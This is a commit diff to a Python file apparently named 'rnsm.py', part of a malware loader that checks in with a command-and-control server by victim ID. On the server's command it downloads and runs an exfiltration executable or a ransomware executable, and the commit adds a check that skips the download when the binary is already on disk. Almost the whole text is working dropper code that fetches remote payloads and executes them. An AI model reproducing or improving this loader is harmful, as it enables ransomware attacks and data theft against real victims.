Add check to see if stage binaries already exist

+++ rnsm.py
@@ -222,44 +222,51 @@ class Loader:
             self.load_exfiltration_stage()
         # elif httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "2":
         #     self.load_keylogger_stage()
-        elif httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "3":
+        if httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "3":
             self.load_ransomware_stage()
         else:
             sleep(30)
 
     def load_exfiltration_stage(self):
-        print("Load exfiltration stage...")
-        try:
-            exfiltration_url = httpx.get(f"{c2_url}/static/exfiltration/exfil.exe")
-            with open("C:\\Users\\Test\Documents\\exfil.exe", "wb") as f:
-                f.write(exfiltration_url.content)
-            os.system("C:\\Users\\Test\Documents\\exfil.exe")
+        # print("Load exfiltration stage...")
+        if not os.path.isfile("C:\\Users\\Test\Documents\\exfil.exe"):
+            try:
+                exfiltration_url = httpx.get(f"{c2_url}/static/exfiltration/exfil.exe")
+                with open("C:\\Users\\Test\Documents\\exfil.exe", "wb") as f:
+                    f.write(exfiltration_url.content)
+                os.system("C:\\Users\\Test\Documents\\exfil.exe")
+                self.sync_loop(init_sleep=60)
+            except httpx.TimeoutException as err:
+                print("load_exfiltration(): Timeout Error --> ", err)
+                sleep(60)
+                self.load_exfiltration_stage()
+            except httpx.RequestError as err:
+                print("load_exfiltration(): Request Exception --> ", err)
+                sleep(60)
+                self.load_exfiltration_stage()
+        else:
             self.sync_loop(init_sleep=60)
-        except httpx.TimeoutException as err:
-            print("load_exfiltration(): Timeout Error --> ", err)
-            sleep(60)
-            self.load_exfiltration_stage()
-        except httpx.RequestError as err:
-            print("load_exfiltration(): Request Exception --> ", err)
-            sleep(60)
-            self.load_exfiltration_stage()
 
     def load_ransomware_stage(self):
-        print("Load ransomware stage...")
-        try:
-            ransomware_url = httpx.get(f"{c2_url}/static/ransomware/ransom.exe")
-            with open("C:\\Users\\Test\Documents\\ransom.exe", "wb") as f:
-                f.write(ransomware_url.content)
-            os.system("C:\\Users\\Test\Documents\\ransom.exe")
+        # print("Load ransomware stage...")
+        # check if ransom.exe exists
+        if not os.path.isfile("C:\\Users\\Test\Documents\\ransom.exe"):
+            try:
+                ransomware_url = httpx.get(f"{c2_url}/static/ransomware/ransom.exe")
+                with open("C:\\Users\\Test\Documents\\ransom.exe", "wb") as f:
+                    f.write(ransomware_url.content)
+                os.system("C:\\Users\\Test\Documents\\ransom.exe")
+                self.sync_loop(init_sleep=60)
+            except httpx.TimeoutException as err:
+                print("load_exfiltration(): Timeout Error --> ", err)
+                sleep(60)
+                self.load_ransomware_stage()
+            except httpx.RequestError as err:
+                print("load_exfiltration(): Request Exception --> ", err)
+                sleep(60)
+                self.load_ransomware_stage()
+        else:
             self.sync_loop(init_sleep=60)
-        except httpx.TimeoutException as err:
-            print("load_exfiltration(): Timeout Error --> ", err)
-            sleep(60)
-            self.load_ransomware_stage()
-        except httpx.RequestError as err:
-            print("load_exfiltration(): Request Exception --> ", err)
-            sleep(60)
-            self.load_ransomware_stage()
 
 
 class Threading(object):
